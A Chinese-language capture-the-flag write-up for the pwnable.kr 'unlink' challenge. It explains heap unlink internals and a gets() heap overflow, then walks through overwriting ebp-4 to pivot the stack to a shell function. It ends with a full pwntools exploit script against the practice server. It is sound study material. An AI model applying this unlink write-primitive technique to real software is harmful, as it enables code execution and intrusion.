---
title: unlink - pwnable.kr
tags:
  - pwnable.kr
  - pwn
  - 堆
  - unlink
categories:
  - pwnable.kr
visitors: 热度
copyright: true
abbrlink: 2a4550bc
date: 2019-09-30 20:00:00
update: 2019-10-02 21:51:40
password:
top:
---


## 预习知识

### 什么是unlinked

unlinked 是堆溢出中的一种常见形式，通过将双向列表中的空闲块拿出来与将要free的物理相邻的块进行合并。（将双向链表上的chunk卸载下来与物理chunk合并）

#### unlink漏洞条件

有3个以上的空闲chunk链表，其中最前面的chunk存在有堆溢出

#### unlink的触发

当使用free函数释放正在使用的chunk时，会相应地检查其相邻的chunk是否空闲。如果空间则将相邻的chunk与free的chunk进行合并。

unlink有两个安全检测机制，都是针对chunk的header部分。

![](https://i.loli.net/2019/09/29/skBJaGIeO2LDSmp.png)

> * prev_size:记录上一chunk的大小
> * size:记录当前chunk的大小
> * fd:在链表中指向下一个空闲chunk
> * bk:在链表中指向上一个空闲chunk

**判断一**

```
if(chunksize (p) != prev_size (next_chunk (p)))
```

此判断所代表的含义为检查将从链表中卸下的chunk其size是否被恶意的修改。记录当前size的地方有两处一个是为当前chunk的size字段和下一个chunk(物理地址上相邻的高地址的chunk)的prev_size字段如果这两个字段的值不等，则unlink会抛出异常。

**判断二**

```
if(__builtin_expect (fd->bk != p || bk->fd != p, 0))
```

这是检查当前chunk的前面一个chunk的bk、后面一个chunk的fd是否指向当前chunk，如果有其中之一不符合，则unlink会抛出异常。

#### unlink解链原理

![2.jpg](https://anquan.baidu.com/upload/ue/image/20190222/1550819912485582.jpg)

    FD=P->fd即当前空闲chunk所指向的下一个空闲chunk
    BK=P->bk即当前空闲chunk所指向的上一个chunk
    FD->bk=BK<=>P->fd->bk= P->bk
    BK->fd=FD<=>P->bk->fd= P->fd
#### unlink引发漏洞原理

**Dword shoot**一种漏洞溢出技巧。漏洞是在双向链表chunk删除时，出现的一种漏洞类型。在进行双向链表的操作过程中，有溢出等的情况下，删除的chunk的fd、bk两个指针被恶意的改写的话，就会在链表删除的时候发生的漏洞。![img](https://img-blog.csdnimg.cn/20190414200335569.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Nob3BwZXJDUA==,size_16,color_FFFFFF,t_70)

unlink 卸载chunk时，会对chunk 的fd、bk指针进行操作，就是因为这个操作我们可以利用堆溢出控制，进行unlink的chunk的fd、bk指针。

如果双向链表的2个指针被修改的话，一般由于修改数据，或者控制程序的跳转。shellcode无法放入这么小的空间中。

## 题目

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
typedef struct tagOBJ{
	struct tagOBJ* fd;
	struct tagOBJ* bk;
	char buf[8];
}OBJ;

void shell(){
	system("/bin/sh");
}

void unlink(OBJ* B){
	OBJ* BK;
	OBJ* FD;

	BK=B->bk;FD=B->fd;
	
	FD->bk=BK;BK->fd=FD;
	//[B->bk]->fd被B->fd值覆写
	//[B->fd]->bk被B->bk覆写
}
int main(int argc, char* argv[]){
	malloc(1024);
	OBJ* A = (OBJ*)malloc(sizeof(OBJ));
	OBJ* B = (OBJ*)malloc(sizeof(OBJ));
	OBJ* C = (OBJ*)malloc(sizeof(OBJ));

	// double linked list: A <-> B <-> C
	A->fd = B;
	B->bk = A;
	B->fd = C;
	C->bk = B;

	printf("here is stack address leak: %p\n", &A);
	printf("here is heap address leak: %p\n", A);
	printf("now that you have leaks, get shell!\n");
	// heap overflow!
	gets(A->buf);

	// exploit this unlink!
	unlink(B);
	return 0;
}
```

概述一下程序运行思路：申请ABC三个大小为0x10的chunk；将ABC之间相互串联起来，形成一个空闲chunk链表（链接方式看下图）。接着答应出chunk A的栈地址、堆地址。之后从A buf后写入我们输入的数据，对B调用unlink函数，将B在链表上卸载下来。

![](https://i.loli.net/2019/09/29/U1NvB3YsmtbJXDH.png)



## 思路

最明显的一点就是``get(A->buf)``存在堆溢出的情况。结合题目给予我们的提示：unlink。存在溢出和有unlink出现，我们就能构造出两个任意指向的指针（fd、bk）。

我们先来看看unlink函数：

```c
void unlink(OBJ* B){
	OBJ* BK;
	OBJ* FD;

	BK=B->bk;
    FD=B->fd;
	FD->bk=BK;
    BK->fd=FD;
	//[B->bk]->fd被B->fd值覆写
	//[B->fd]->bk被B->bk覆写
}
```

我们先来解读一下unlink是怎么释放一个chunk的。我们就用下图中堆块解释：

![](https://i.loli.net/2019/09/29/zTsGIFCKBnh32lP.png)

我们先将四条转换方程式化简一下：

```
B->fd->bk = B->bk
B->bk->fd = B->fd
```



``B->bk``   =   ``0x1030``；``B->fd``   =   ``0x1010``；都是存储着内存地址的变量。换句话说就是``B->bk`` ``B->fd``都是地址值。

``B->fd->bk ``   =   ``*((B->fd)+bk)``   =``*(0x1010+4)``；``B->bk->fd``   =   ``*((B->bk)+fd)``   =   ``*(0x1030+0)``；可以看见现在变成了指针，而不是上面的地址值，而是一个指针。

那么最后的运算结果是：

```c
*(0x1010+4) = 0x1030//0x1014（前一个chunk的bk）的值被覆盖为0x1010
*(0x1030+0) = 0x1010//0x1030（后一个chunk的fd）的值被覆盖为0x1010
```

unlink之后的chunk指针就如同最下行所示。

![2.jpg](https://anquan.baidu.com/upload/ue/image/20190222/1550819912485582.jpg)



我们初定的利用思路是：利用unlink和堆溢出，创造出两个所我们所控制的任意指针，然后将程序控制流控制到shell上。将shellcode写到堆上，然后覆盖返回指针到堆上的方法不可行。因为程序开启了NX，堆栈上数据不能运行。而且程序中也有现成的shell。

![img](https://images2015.cnblogs.com/blog/1071926/201707/1071926-20170714154547056-1917497079.png)

做到这里就有点进行不下去，主要是不知覆盖那个函数的返回地址，来控制程序流。查看别人writeup，发现关键点在这里：

![](https://i.loli.net/2019/09/29/y8r4QgXz3GUmIHc.png)

* ``retn``

  retn指令作用是栈顶字单元出栈，其赋值给EIP寄存器，只要能够修改ESP寄存器的内容修改为shellcode的地址就能执行shellcode。

* ``lea esp,[ecx-4]``

  lea指令将存储器操作数mem的4位16进制偏移地址送到指定的寄存器。eg：SI=1000H，执行指令 LEA BX , [SI] 后，BX=1000H。也就是说esp的值来自[ecx-4]指向的值 。

* ``leave``

  leave指令相当于mov esp ebp，pop ebp，对esp数据的来源无影响。

* ``mov ecx,[ebp+var_4]``相当于``mov ecx,[ebp-4]``

  ecx等于[ebp-4]指向的值，也就是我们需要将[ebp-4]指向的值修改为shellcode+4

还记得我们已经分析得到的条件：**可以利用堆溢出和unlind创造出两个指针**。（ebp的值在程序运行时值不变）

我们就将其中的一个任意指针修改为``*(ebp-4)``，将ebp-4的值覆写为shellcode+4。

那我们先找出shellcode 和 ebp的内存地址：

* IDA函数表中找到shellcode地址：

  ![](https://i.loli.net/2019/09/29/RxZXovqD6PMCFjf.png)

* 程序会将chunk A的栈地址和堆地址，而栈地址是用ebp计算偏移得到的。IDA中查看chunk A栈地址的偏移算法：

  ![](https://i.loli.net/2019/09/29/6iAwIYcbFXzE8Bf.png)

  chunk A stack addr = ebp+var_14 = ebp - 0x14

从这里就可以推算出ebp - 0x4 相对于的chunk A 栈地址的相对位置，进而推算出实际内存地址。

shellcode的地址，我们需要找一个地址放置。方便我们构建的任意地址指针读取到ebp-0x4中。那么，我们就一齐写入到chunk A 堆中。

---

接下来就是看看构造指针的fd、bk需要填入什么数。unlink 的计算方程：

```c
B->bk->fd = B->fd
B->fd->bk = B->bk

*(0x1030+0) = 0x1010//0x1030（后一个chunk的fd）的值被覆盖为0x1010 
*(0x1010+4) = 0x1030//0x1014（前一个chunk的bk）的值被覆盖为0x1010
```

我们利用第一个指针进行写入，也就是：``*(bk+0)=fd``。换而言之就是``*(ebp-4)=shellcode-4``。

得出我们需要填入的是fd = chunk A堆地址+12；bk = chunk A栈地址 + 0x10

初始情况下的chunk A :

data A on heap:

———————————     <=A

|       FD       |      BK       |    

———————————     <=A->buf , A+0x8

|   put shellcode here     |

|    length of buf is 0x8   |

———————————     

| presizeB    |     sizeB    |    

———————————     <=B , A+0x8+0x8+0x8

|       FD       |      BK       |    

———————————     <=B->buf

|                                      |

———————————

好，我们现在构造payload：

```
# 'a'用作填充chunk A剩余空间到达chunk B堆顶；
payload = p32(shell_addr)+'a'*12+p32(heap_addr + 12)+p32(stack_addr + 0x10)
```

溢出覆写之后的chunk A：

data A on heap:

———————————     <=A

|       FD       |      BK       |    

———————————     <=A->buf , A+0x8

|    shellcode (4 byte)     |

|   AAAA (4 byte junk)    |

———————————     

|   AAAA      |    AAAA     |    

———————————     <=B , A+0x8+0x8+0x8

|A heap +12|A stack+0x10|    

———————————     <=B->buf

|                                      |

———————————

接下来调用unlink及其后面指令的原理简单记录：

```
//unlink之后得到的两条方程
*（（A stack+0x10）+ 0）= A heap +12
*（（A heap +12） + 4）= A stack+0x10

//指针一化简得到
*(ebp-0x14+0x10+0)=shellcode + 0x4
//ebp-0x4指向的值被覆写为shellcode + 0x4

//ebp-0x4指向的值shellcode+4被传入ecx
mov ecx,[ebp+var_4]

//ecx-4指向的shellcode开始行被传入到esp中（shellcode+4-4）
lea esp,[ecx-4]

//退出main，但是eip被修改为shellcode开始运行行，变成了运行shellcode
retn
```



## 脚本

```python
#coding=utf-8
from pwn import *
context.log_level = 'debug'
shell_addr = 0x080484eb#IDA函数列表可查得

# 与服务器建立ssh链接
s =  ssh(host='pwnable.kr',
         port=2222,
         user='unlink',
         password='guest'
        )
p = s.process("./unlink") # 加载程序
# 获取 A 栈地址
p.recvuntil("here is stack address leak: ")
stack_addr = p.recv(10)
stack_addr = int(stack_addr,16)
# 获取 A 堆地址
p.recvuntil("here is heap address leak: ")
heap_addr = p.recv(9)
heap_addr = int(heap_addr,16)

payload = p32(shell_addr)+'a'*12+p32(heap_addr + 12)+p32(stack_addr +16)

p.send(payload)
p.interactive()
```



## 参考

[全面剖析Pwnable.kr unlink](blog.csdn.net/qq_33528164/article/details/77061932)

[pwnable.kr unlink](blog.sina.com.cn/s/blog_d18fc6010102x4l4.html)

[pwnable.kr之unlink](jianshu.com/p/90c5e76cae2e)

[pwnable.kr unlink之write up](https://www.cnblogs.com/liuyimin/articles/7381018.html)

[【pwnable.kr】 unlink](https://www.cnblogs.com/p4nda/p/7172104.html)

